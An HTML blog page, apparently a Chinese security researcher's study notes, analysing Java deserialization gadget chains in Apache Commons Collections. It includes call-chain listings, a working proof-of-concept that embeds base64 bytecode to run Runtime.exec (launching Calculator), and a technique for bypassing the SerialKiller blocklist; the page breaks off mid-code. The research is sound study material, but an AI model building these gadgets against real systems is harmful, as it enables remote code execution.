@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="tiehanhan" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      java安全漫谈观后感(十一)-加强篇 
+      
+      
+      |
+    
+     daidaitiehanhan&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/avatar.gif">
+    <link rel="icon" href="/images/avatar.gif">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.gif" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">tiehanhan</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">java安全漫谈观后感(十一)-加强篇</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2022-04-30 23:35:19
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="java安全漫谈观后感-十一-加强篇"><a href="#java安全漫谈观后感-十一-加强篇" class="headerlink" title="java安全漫谈观后感(十一)-加强篇"></a>java安全漫谈观后感(十一)-加强篇</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>补充一些p神没讲到，也非ysoserial官方，但是师傅们公开的gadget思路</p>
+<h2 id="CommonsCollections8"><a href="#CommonsCollections8" class="headerlink" title="CommonsCollections8"></a>CommonsCollections8</h2><p><a target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java">wh1t3p1g师傅ysoserial里的这个</a>，是<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/pull/116">navalorenzo师傅</a>研究的，看代码感觉和CC2，CC4差不多，都是基于<code>TransformingComparator.compare()</code>触发<code>transform()</code></p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220429153717962.png" alt="image-20220429153717962"></p>
+<p>直接debug看调用链</p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220429154316779.png" alt="image-20220429154316779"></p>
+<p>梳理核心部分：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gadget Chain:</span></span><br><span class="line"><span class="comment">//            java.util.TreeBag.readObject()</span></span><br><span class="line"><span class="comment">//               java.util.TreeMap.put()</span></span><br><span class="line"><span class="comment">//               java.util.TreeMap.compare()</span></span><br><span class="line"><span class="comment">//                    org.apache.commons.collections4.comparators.TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">//                        org.apache.commons.collections4.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">//                            com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer()</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到除了反序列化起点变成了<code>TreeBag</code>其他和CC2，CC4没有大的区别</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先看到<code>TreeBag.readObject</code></p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220429155248820.png" alt="image-20220429155248820"></p>
+<p>comp是个<code>Comparator</code>，是通过<code>in.readObject</code>拿到的，所以我们序列化之前的数据需要指定好<code>Comparator</code></p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220429155404370.png" alt="image-20220429155404370"></p>
+<p>TreeBag的构造函数支持传入<code>Comparator</code>，显然可以new一个<code>Comparator</code>是<code>TransformingComparator</code>的<code>TreeBag</code></p>
+<p><code>TreeBag.readObject</code>中还会触发到<code>super.doReadObject()</code>，跟入看看</p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220429155742797.png" alt="image-20220429155742797"></p>
+<p>会进入<code>TreeMap.put</code>方法</p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220429155848279.png" alt="image-20220429155848279"></p>
+<p>一进来就会调用<code>TreeMap.compare</code></p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220429155921654.png" alt="image-20220429155921654"></p>
+<p>如果comparator不是空，就会触发<code>comparator.compare</code>，即<code>TransformingComparator.compare()</code>。显然只要咱们给TreeBag指定好comparator就可以满足条件。</p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220429155958228.png" alt="image-20220429155958228"></p>
+<p>后面的都是老套路时间。</p>
+<h2 id="CommonsCollections9"><a href="#CommonsCollections9" class="headerlink" title="CommonsCollections9"></a>CommonsCollections9</h2><p><a target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections9.java">wh1t3p1g师傅的CC9</a>是CC6+CC7，前面讲过了，这里忽略。</p>
+<p>梅子酒师傅的<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/pull/125">CC9</a>，找到一个<a target="_blank" rel="noopener" href="https://tool.oschina.net/uploads/apidocs/commons-collections/org/apache/commons/collections/map/DefaultedMap.html">DefaultedMap</a>作用和<code>LazyMap</code>差不多，需要Commons Collections 3.2及以上版本。</p>
+<p>看看师傅的代码</p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220429162758562.png" alt="image-20220429162758562"></p>
+<p>就是CC5把<code>LazyMap</code>换成了<code>DefaultedMap</code></p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220429163140815.png" alt="image-20220429163140815"></p>
+<p>可以看看<code>DefaultedMap.get</code></p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220429163305988.png" alt="image-20220429163305988"></p>
+<p>和<code>LazyMap.get</code>非常类似，都可以触发<code>transform(key)</code></p>
+<p>理论上用到了<code>LazyMap</code>的链都可以用DefaultedMap替换。有兴趣可以试一试。</p>
+<p>核心利用链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  Gadet Chain:</span></span><br><span class="line"><span class="comment">//     javax.management.BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">//         org.apache.commons.collections.keyvalue.TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">//         org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">//             org.apache.commons.collections.map.DefaultedMapMap.get()</span></span><br><span class="line"><span class="comment">//                 org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">//                 org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">//                     Runtime.exec()</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="CommonsCollections11-amp-12"><a href="#CommonsCollections11-amp-12" class="headerlink" title="CommonsCollections11&amp;12"></a>CommonsCollections11&amp;12</h2><p>天下大木头师傅的文章<a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1536">CommonsCollections11 分析</a>讲的gadget就是<a target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections10.java">wh1t3p1g大师傅的CC10</a></p>
+<p>c0ny1大师傅的<a target="_blank" rel="noopener" href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker/blob/master/src/main/java/me/gv7/woodpecker/yso/payloads/CommonsCollections11.java">CC11</a>是CC5的无数组实现</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8673">清水师傅的CommonsCollections12</a>和前面讲的CCK3一样</p>
+<p>以上内容的实现都在前面文章中提到过，不做过多叙述了。</p>
+<h2 id="MapTransformer"><a href="#MapTransformer" class="headerlink" title="MapTransformer"></a>MapTransformer</h2><p>在知识星球看到Rickyღ 师傅分享的一个trick，可以用于<code>ConstantTransformer</code>被禁用了的情景，能起到类似<code>ConstantTransformer</code>的作用。</p>
+<p>看看<code>MapTransformer</code>的实现</p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220429234944348.png" alt="image-20220429234944348"></p>
+<p><code>MapTransformer</code>的构造函数是private修饰，但是可以用<code>getInstance()</code>做实例化。</p>
+<p>关键的<code>transform()</code>方法可以返回Map中传入的这个key对应的value，例如我们这里Map中的value是<code>TrAXFilter.class</code>，则会返回TrAXFilter这个Class。</p>
+<p>比如随便用一个HashMap放入一个key，对应的value是TrAXFilter.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashmap.put(<span class="string">&quot;com.xxxbank&quot;</span>,TrAXFilter.class);</span><br></pre></td></tr></table></figure>
+
+<p>前面学习无数组CC构造时提到了<code>LazyMap.get(key)</code>可以传递key参数，即只要我们<code>TiedMapEntry</code>的key设置为com.xxxbank则可以给<code>MapTransformer.transform(input)</code>传递一个input的值。</p>
+<p>基于能全版本用的CC3改一个用<code>MapTransformer</code>的实现</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3Maptest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.decodeBase64(<span class="string">&quot;yv66vgAAADQAOgoACQAhCQAiACMIACQKACUAJgoAJwAoCAApCgAnACoHACsHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHUxieXRlY29kZXMvRXZpbFRlbXBsYXRlc0ltcGw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgcALgEAClNvdXJjZUZpbGUBABZFdmlsVGVtcGxhdGVzSW1wbC5qYXZhDAAcAB0HAC8MADAAMQEAE0hlbGxvIFRlbXBsYXRlc0ltcGwHADIMADMANAcANQwANgA3AQA9L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcgwAOAA5AQAbYnl0ZWNvZGVzL0V2aWxUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACAAJAAAAAAADAAEACgALAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAKAA4AAAAgAAMAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAEwAUAAIAFQAAAAQAAQAWAAEACgAXAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAMAA4AAAAqAAQAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAGAAZAAIAAAABABoAGwADABUAAAAEAAEAFgABABwAHQACAAwAAABMAAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAgANAAAAEgAEAAAADwAEABAADAARABUAEgAOAAAADAABAAAAFgAPABAAAAAVAAAABAABAB4AAQAfAAAAAgAg&quot;</span>.getBytes());</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;2333&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        HashMap hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashmap.put(<span class="string">&quot;com.xxxbank&quot;</span>,TrAXFilter.class);</span><br><span class="line">        Transformer maptransformer=  MapTransformer.getInstance(hashmap);</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                maptransformer,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map outerMap= LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line">        TiedMapEntry tme=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;com.xxxbank&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;xxxbank&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;com.xxxbank&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220430001049273.png" alt="image-20220430001049273"></p>
+<p>Rickyღ 师傅分享的代码里用了<code>DefaultedMap</code>替代<code>LayMap.get()</code>，构造了一条基于相对冷门的类实现的CC链。</p>
+<p>调用链</p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220430011430882.png" alt="image-20220430011430882"></p>
+<p>核心部分</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gadget Chain:</span></span><br><span class="line"><span class="comment">//            java.util.HashMap.readObject()</span></span><br><span class="line"><span class="comment">//            java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">//                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">//                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">//                    org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">//                        org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">//                        org.apache.commons.collections.functors.MapTransformer.transform()</span></span><br><span class="line"><span class="comment">//                        org.apache.commons.collections.functors.InstantiateTransformer.transform()</span></span><br><span class="line"><span class="comment">//                                com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&lt;init&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="FactoryTransformer"><a href="#FactoryTransformer" class="headerlink" title="FactoryTransformer"></a>FactoryTransformer</h2><p>Y4tacker师傅分享的一个trick，绕过了<a target="_blank" rel="noopener" href="https://github.com/ikkisoft/SerialKiller/blob/master/config/serialkiller.conf">SerialKiller</a></p>
+<p>看看<code>FactoryTransformer</code>代码</p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220430002445142.png" alt="image-20220430002445142"></p>
+<p>核心的<code>transform()</code>方法可以触发<code>this.iFactory.create()</code>，既可以触发任意<code>Factory</code>的<code>create()</code>方法。</p>
+<p>看看实现<code>Factory</code>的几个类</p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220430002716213.png" alt="image-20220430002716213"></p>
+<p>Y4tacker师傅发现</p>
+<p><code>org.apache.commons.collections.functors.ConstantFactory</code>可以代替<code>ConstantTransformer</code>起到一样的效果</p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220430003044739.png" alt="image-20220430003044739"></p>
+<p><code>org.apache.commons.collections.functors.InstantiateFactory</code>可以代替<code>InstantiateTransformer</code>起到一样的效果</p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220430002838578.png" alt="image-20220430002838578"></p>
+<p>配合构造<code>InstantiateFactory</code>的构造函数可以传入<code>TrAXFilter.Class</code>给<code>this.Constructor</code></p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220430003831716.png" alt="image-20220430003831716"></p>
+<p>基于CCK1改改，可以得到一个能过SerialKiller的gadget</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CCFactorytest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.decodeBase64(<span 